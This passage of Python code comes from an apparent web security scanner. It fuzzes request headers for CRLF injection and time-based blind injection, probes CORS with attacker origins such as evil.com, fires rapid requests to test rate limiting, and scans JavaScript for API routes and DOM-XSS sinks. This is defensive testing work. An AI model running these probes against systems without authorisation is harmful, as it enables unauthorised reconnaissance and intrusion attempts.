                'remediation': 'Check connectivity.', 'match': '', 'context': str(e),
                'line': 0, 'source': 'FUZZER'
            })
            return findings

        for header in target_headers:
            for payload in payloads:
                try:
                    t0 = time.time()
                    resp = session.get(
                        url, timeout=15,
                        headers={
                            'User-Agent': 'VulcanX-Fuzzer/1.0',
                            header: payload,
                        }
                    )
                    elapsed = time.time() - t0
                except Exception:
                    continue

                delta = elapsed - baseline_time

                # 1. CRLF Injection — newline chars reflected or header in response
                if '\r\n' in payload or '%0d%0a' in payload.lower():
                    injected_header_name = 'X-Injected'
                    if injected_header_name.lower() in {k.lower() for k in resp.headers}:
                        findings.append({
                            'url': url, 'type': 'CRLF_INJECTION',
                            'severity': 'HIGH',
                            'description': (
                                f'CRLF injection confirmed via header "{header}". '
                                'Injected header appeared in response.'
                            ),
                            'remediation': 'Strip or reject CR/LF characters from all header inputs.',
                            'match': payload,
                            'context': f'Header: {header}, Injected: {injected_header_name}',
                            'line': 0, 'source': 'FUZZER'
                        })

                # 2. Reflection in body
                if payload in resp.text and payload not in baseline_body:
                    findings.append({
                        'url': url, 'type': 'HEADER_VALUE_REFLECTED',
                        'severity': 'MEDIUM',
                        'description': (
                            f'Value from header "{header}" reflected in response body.'
                        ),
                        'remediation': 'Do not echo request headers into responses without sanitisation.',
                        'match': payload,
                        'context': resp.text[max(0, resp.text.find(payload)-40):
                                             resp.text.find(payload)+40+len(payload)],
                        'line': 0, 'source': 'FUZZER'
                    })

                # 3. 500 Internal Server Error
                if resp.status_code >= 500:
                    findings.append({
                        'url': url, 'type': 'HEADER_TRIGGERS_500',
                        'severity': 'MEDIUM',
                        'description': (
                            f'Header "{header}" with payload caused HTTP {resp.status_code}.'
                        ),
                        'remediation': 'Handle header values defensively; errors may leak info.',
                        'match': payload,
                        'context': f'Status: {resp.status_code}',
                        'line': 0, 'source': 'FUZZER'
                    })

                # 4. Time delay (>4s)
                if delta > 4.0:
                    findings.append({
                        'url': url, 'type': 'HEADER_TIME_DELAY',
                        'severity': 'HIGH',
                        'description': (
                            f'Time delay detected when fuzzing header "{header}": '
                            f'+{delta:.2f}s over baseline.'
                        ),
                        'remediation': 'Investigate backend processing of this header for blind injection.',
                        'match': payload,
                        'context': f'Delta={delta:.2f}s, Header={header}',
                        'line': 0, 'source': 'FUZZER'
                    })

        self.findings.extend(findings)
        return findings

    # ------------------------------------------------------------------
    # CORS SCANNER
    # ------------------------------------------------------------------
    def check_cors(self, url, headers=None):
        """
        Tests the target URL for CORS misconfigurations by probing with
        known-malicious origin values.

        Returns: list of Finding dicts.
        """
        if _requests is None:
            return []

        findings = []
        session = _requests.Session()
        req_headers = {'User-Agent': 'VulcanX-CORS/1.0'}
        if headers:
            req_headers.update(headers)

        parsed = urllib.parse.urlparse(url)
        target_origin = f"{parsed.scheme}://{parsed.netloc}"

        test_origins = [
            'https://evil.com',
            'null',
            f'https://{parsed.netloc}.evil.com',
            f'https://evil{parsed.netloc}',
        ]

        for origin in test_origins:
            try:
                probe_headers = dict(req_headers)
                probe_headers['Origin'] = origin
                resp = session.get(url, headers=probe_headers, timeout=10)
            except Exception:
                continue

            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '').lower()

            # 1. ACAO wildcard with credentials — CRITICAL
            if acao == '*' and acac == 'true':
                findings.append({
                    'url': url, 'type': 'CORS_WILDCARD_WITH_CREDENTIALS',
                    'severity': 'CRITICAL',
                    'description': (
                        'CORS misconfiguration: Access-Control-Allow-Origin: * combined with '
                        'Access-Control-Allow-Credentials: true. This violates the spec and may '
                        'allow any origin to read credentialed responses in certain browser/server combos.'
                    ),
                    'remediation': 'Never combine wildcard ACAO with credentials. Explicitly whitelist trusted origins.',
                    'match': f'ACAO: {acao} / ACAC: {acac}',
                    'context': f'Probe Origin: {origin}',
                    'line': 0, 'source': 'CORS'
                })

            # 2. Null origin accepted — HIGH
            elif origin == 'null' and acao == 'null':
                findings.append({
                    'url': url, 'type': 'CORS_NULL_ORIGIN_ACCEPTED',
                    'severity': 'HIGH',
                    'description': (
                        'CORS misconfiguration: Server reflects "null" origin. '
                        'Sandboxed iframes can be used to send null-origin requests, '
                        'enabling cross-site data reads if credentials are included.'
                    ),
                    'remediation': 'Do not whitelist the null origin. Use an explicit allowlist of trusted domains.',
                    'match': f'ACAO: {acao}',
                    'context': f'Probe Origin: {origin}',
                    'line': 0, 'source': 'CORS'
                })

            # 3. Attacker origin reflected — HIGH
            elif acao and acao == origin and origin not in ('null', target_origin):
                sev = 'CRITICAL' if acac == 'true' else 'HIGH'
                findings.append({
                    'url': url, 'type': 'CORS_ORIGIN_REFLECTION',
                    'severity': sev,
                    'description': (
                        f'CORS misconfiguration: Server reflects attacker-controlled origin "{origin}" '
                        f'in Access-Control-Allow-Origin. '
                        + (f'Credentials are also allowed (ACAC: true), enabling full CSRF/session theft.' if acac == 'true' else '')
                    ),
                    'remediation': 'Validate Origin against a strict server-side allowlist. Never reflect arbitrary origins.',
                    'match': f'ACAO: {acao}',
                    'context': f'Probe Origin: {origin}, ACAC: {acac}',
                    'line': 0, 'source': 'CORS'
                })

        self.findings.extend(findings)
        return findings

    # ------------------------------------------------------------------
    # RATE LIMITING TESTER
    # ------------------------------------------------------------------
    def check_rate_limiting(self, url, method='POST', threshold=10):
        """
        Sends `threshold` rapid requests and checks for 429 / account lockout responses.
        If no rate limiting is observed: emits a MEDIUM finding.

        Returns: list of Finding dicts.
        """
        if _requests is None:
            return []

        findings = []
        session = _requests.Session()
        req_headers = {'User-Agent': 'VulcanX-RateTest/1.0'}

        rate_limited = False
        lockout_detected = False
        status_codes = []

        for i in range(threshold):
            try:
                resp = session.request(
                    method.upper(), url,
                    headers=req_headers,
                    timeout=10
                )
                status_codes.append(resp.status_code)

                if resp.status_code == 429:
                    rate_limited = True
                    break

                # Lockout heuristics: account-locked phrases in body
                body_lower = resp.text.lower()
                if any(kw in body_lower for kw in
                       ['account locked', 'too many attempts', 'temporarily blocked',
                        'brute force', 'captcha required', 'rate limit']):
                    lockout_detected = True
                    break
            except Exception:
                break

        if rate_limited:
            findings.append({
                'url': url, 'type': 'RATE_LIMITING_PRESENT',
                'severity': 'INFO',
                'description': f'Rate limiting (HTTP 429) triggered after {i+1}/{threshold} requests.',
                'remediation': 'Rate limiting is working correctly.',
                'match': f'HTTP 429 on request #{i+1}',
                'context': f'Method={method}, Threshold={threshold}',
                'line': 0, 'source': 'RATE_TEST'
            })
        elif lockout_detected:
            findings.append({
                'url': url, 'type': 'ACCOUNT_LOCKOUT_DETECTED',
                'severity': 'INFO',
                'description': f'Account lockout mechanism triggered after {i+1}/{threshold} requests.',
                'remediation': 'Lockout detected; verify the lockout window and unlock procedure.',
                'match': f'Lockout phrase on request #{i+1}',
                'context': f'Method={method}, Threshold={threshold}',
                'line': 0, 'source': 'RATE_TEST'
            })
        else:
            findings.append({
                'url': url, 'type': 'NO_RATE_LIMITING',
                'severity': 'MEDIUM',
                'description': (
                    f'No rate limiting detected after {threshold} rapid {method} requests. '
                    f'Status codes observed: {list(set(status_codes))}. '
                    'This endpoint may be vulnerable to brute-force or credential-stuffing attacks.'
                ),
                'remediation': (
                    'Implement rate limiting (e.g. token bucket, leaky bucket), '
                    'account lockout after N failures, and CAPTCHA for sensitive endpoints.'
                ),
                'match': f'{threshold} requests, no 429/lockout',
                'context': f'Method={method}, Status codes: {list(set(status_codes))}',
                'line': 0, 'source': 'RATE_TEST'
            })

        self.findings.extend(findings)
        return findings

    def _flatten_json_params(self, obj, prefix=''):
        """Yields (dotted.key, value) pairs from a parsed JSON body, recursing into dicts/lists."""
        if isinstance(obj, dict):
            for k, v in obj.items():
                key = f'{prefix}.{k}' if prefix else k
                if isinstance(v, (dict, list)):
                    yield from self._flatten_json_params(v, key)
                else:
                    yield (k, v)
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                key = f'{prefix}[{i}]'
                if isinstance(v, (dict, list)):
                    yield from self._flatten_json_params(v, key)
                else:
                    yield (prefix.rsplit('.', 1)[-1] if prefix else str(i), v)

    def _extract_api_map(self, url, content, source='STATIC'):
        """
        Statically parses JS content to find backend API routes and their expected parameters.
        Builds a map for the pentester.
        """
        # Look for fetch('/api/...') or axios.post('/api/...', { param: 'val' })
        api_pattern = r'(?:fetch|axios(?:\.post|\.get|\.put)?|ajax)\s*\(\s*["\']([^"\']*/api/[^"\']*)["\'](.*?\})?'
        matches = re.finditer(api_pattern, content, re.IGNORECASE | re.DOTALL)
        
        for match in matches:
            api_route = match.group(1)
            options_block = match.group(2)
            
            params = []
            if options_block:
                # Naively extract JSON keys from the options block
                key_pattern = r'["\']?([a-zA-Z0-9_]+)["\']?\s*:'
                keys = re.findall(key_pattern, options_block)
                params = list(set(keys))
            
            self.findings.append({
                'url': url,
                'type': 'API_ROUTE_DISCOVERED',
                'severity': 'INFO',
                'description': f'API Route Extracted: {api_route}',
                'remediation': 'Manual review of endpoints and parameters for IDOR/Mass Assignment.',
                'match': f"{api_route} -> Params: {params if params else 'Unknown'}",
                'context': content[max(0, match.start() - 20):min(len(content), match.start() + 100)].strip().replace('\n', ' '),
                'line': content[:match.start()].count('\n') + 1,
                'source': source
            })

    def _check_dom_xss_taint(self, url, content, source='STATIC'):
        """
        Performs a basic static taint analysis tracking sources to sinks in JS.
        """
        # Sources: location, document.cookie, window.name
        # Sinks: innerHTML, document.write, eval, setTimeout
        
        # Regex to catch assigning a source to a variable
        source_pattern = r'(var|let|const)\s+([a-zA-Z0-9_]+)\s*=\s*.*?(location\.hash|location\.search|document\.cookie|window\.name)'
        sources_matches = re.finditer(source_pattern, content)
        
        tainted_vars = set()
        for match in sources_matches:
            tainted_vars.add(match.group(2))
            
        if not tainted_vars:
            return
            
        # Regex to catch sinks
        sink_pattern = r'(innerHTML\s*=|document\.write\s*\(|eval\s*\()'
        sinks_matches = re.finditer(sink_pattern, content)
        
        for match in sinks_matches:
            # Look backwards slightly to see what's going into the sink
            context_block = content[max(0, match.start() - 10):min(len(content), match.end() + 50)]
            for tainted in tainted_vars:
                if tainted in context_block:
                    self.findings.append({
                        'url': url,
                        'type': 'DOM_XSS_STATIC_TAINT',
                        'severity': 'HIGH',
                        'description': f'Static Taint Analysis: Tainted variable "{tainted}" flows into a dangerous sink.',
                        'remediation': 'Ensure user input is properly sanitized before reaching DOM sinks.',
                        'match': f'Variable {tainted} -> Sink',
                        'context': content[max(0, match.start() - 50):min(len(content), match.end() + 100)].strip(),
                        'line': content[:match.start()].count('\n') + 1,
                        'source': source
                    })

